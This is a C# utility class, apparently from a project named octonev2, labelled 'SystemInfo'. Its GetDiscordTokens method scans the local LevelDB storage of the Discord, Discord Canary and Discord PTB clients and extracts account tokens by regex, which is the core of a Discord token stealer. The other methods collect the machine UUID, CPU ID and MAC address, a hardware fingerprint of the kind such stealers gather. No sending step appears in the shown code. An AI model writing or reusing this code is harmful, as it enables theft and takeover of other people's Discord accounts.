using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.NetworkInformation;
using System.Management;
using System.Linq;

namespace octonev2.Utils
{
    public static class SystemInfo
    {
        public static async Task<List<string>> GetDiscordTokens()
        {
            var tokens = new List<string>();
            var paths = new[]
            {
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord\\Local Storage\\leveldb"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary\\Local Storage\\leveldb"),
        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordptb\\Local Storage\\leveldb")
    };

            foreach (var path in paths)
            {
                if (Directory.Exists(path))
                {
                    foreach (var file in Directory.GetFiles(path, "*.ldb"))
                    {
                        try
                        {
                            string content = await File.ReadAllTextAsync(file);
                            var matches = Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}");

                            foreach (Match match in matches)
                            {
                                if (!tokens.Contains(match.Value))
                                {
                                    tokens.Add(match.Value);
                                }
                            }
                        }
                        catch
                        {
                            continue;
                        }
                    }
                }
            }
            return tokens;
        }


        public static string GetMachineId()
        {
            try
            {
                using var mc = new ManagementClass("Win32_ComputerSystemProduct");
                using var moc = mc.GetInstances();

                foreach (var mo in moc)
                {
                    return mo["UUID"].ToString();
                }
            }
            catch
            {
                return Environment.MachineName;
            }
            return Environment.MachineName;
        }

        public static string GetCpuId()
        {
            try
            {
                using var mc = new ManagementClass("Win32_Processor");
                using var moc = mc.GetInstances();

                foreach (var mo in moc)
                {
                    return mo["ProcessorId"].ToString();
                }
            }
            catch
            {
                return "Unknown CPU";
            }
            return "Unknown CPU";
        }

        public static string GetMacAddress()
        {
            try
            {
                return NetworkInterface
                    .GetAllNetworkInterfaces()
                    .Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    .Select(nic => nic.GetPhysicalAddress().ToString())
                    .FirstOrDefault() ?? "Unknown MAC";
            }
            catch
            {
                return "Unknown MAC";
            }
        }
    }
}
